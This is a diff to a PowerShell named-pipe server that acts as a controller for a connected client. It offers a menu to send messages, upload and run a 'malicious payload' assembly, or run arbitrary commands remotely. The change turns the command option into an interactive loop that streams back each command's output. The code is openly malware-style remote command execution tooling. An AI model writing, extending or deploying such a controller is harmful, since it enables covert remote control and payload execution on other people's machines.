@@ -16,11 +16,16 @@ try{
     $sw.AutoFlush=$true
 
     while ($pipeServer.IsConnected){
-        $action = Read-Host "What action do you want to do ?  
+        # Reset the variables command and messages after each task
+        $msg = ""
+        $command = ""
+
+        $action = Read-Host "
         1. Send message to client
         2. Run Malicious code
         3. Run Command
         4. Quit
+
 "
         
         if ($action -eq 1){
@@ -30,6 +35,7 @@ try{
                 $sw.WriteLine($msg)
             }
         }
+
         elseif ($action -eq 2){
             $sw.WriteLine("action=2")
             Write-Host "Uploading malicious payload to client"
@@ -39,23 +45,30 @@ try{
             $sw.WriteLine($assemblyString) # Server sending to the client
 
         }
+
         elseif ($action -eq 3){
             $sw.WriteLine("action=3")
-            Write-Host "Sending commands to client"
-            $command = Read-Host "Run command : "
-            $sw.WriteLine($command)
+            while($command -ne "stop"){
+                $command = Read-Host "Run command"
+                $sw.WriteLine($command)
 
-            # Receive command result lenght from the client
-            $lenght = [int]$sr.ReadLine()
+                if($command -eq "stop"){
+                    # do nothing
+                }
 
-            #Output the command result
-            for($cpt = 0; $cpt -lt $lenght; $cpt++){
-                $result = $sr.ReadLine()
-                Write-Host $result
+                else{
+                    # Receive command result lenght from the client
+                    $lenght = [int]$sr.ReadLine()
+
+                    #Output the command result
+                    for($cpt = 0; $cpt -lt $lenght; $cpt++){
+                        $result = $sr.ReadLine()
+                        Write-Host $result
+                    }  
+                }
             }
-
-
         }
+
         elseif ($action -eq 4){
             $sw.WriteLine("action=4")
             $sw.Dispose()
